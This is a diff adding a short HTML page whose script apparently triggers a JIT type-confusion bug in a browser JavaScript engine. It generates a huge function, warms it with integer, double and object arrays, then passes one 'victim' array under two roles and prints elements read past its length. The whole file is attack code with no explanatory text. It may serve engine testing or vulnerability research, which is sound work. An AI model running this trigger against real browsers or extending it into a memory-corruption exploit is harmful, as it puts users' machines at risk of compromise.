@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const lines = ["function trigger(x, arr, alias, dst, obj, idx, limit) {"];
+for (let i = 0; i < 650; i++) lines.push(`if (x === ${i}) return ${i};`);
+lines.push("let pre = alias[0];");
+lines.push("arr[0] = 1.1;");
+lines.push("dst[0] = obj;");
+lines.push("let i = 0, res = pre;");
+lines.push("while (i < limit) {");
+for (let i = 0; i < 430; i++) lines.push(`res = (res + ${i % 7}) | 0;`);
+lines.push("res = alias[idx] + 0.0;");
+lines.push("i++;");
+lines.push("}");
+lines.push("return res;");
+lines.push("}");
+lines.push("return trigger;");
+const trigger = new Function(lines.join("\n"))();
+function smi() { return [111, 222, 333]; }
+function dbl() { return [1.1, 2.2, 3.3]; }
+function objarr() { return [{ warm: 1 }, { warm: 2 }, { warm: 3 }]; }
+const obj = { marker: 0x1337 };
+for (let i = 0; i < 15000; i++) {
+  trigger(1000, smi(), dbl(), objarr(), obj, 1, 1);
+}
+const victim = smi();
+const dst = objarr();
+try {
+  const result = trigger(1000, victim, victim, dst, obj, 1, 1);
+  console.log("result", typeof result, result);
+} catch (e) { console.log("caught", e && e.name, e && e.message); }
+for (let i = 0; i < 6; i++) console.log("victim" + i, typeof victim[i], victim[i]);
+console.log("victim length", victim.length);
+</script>
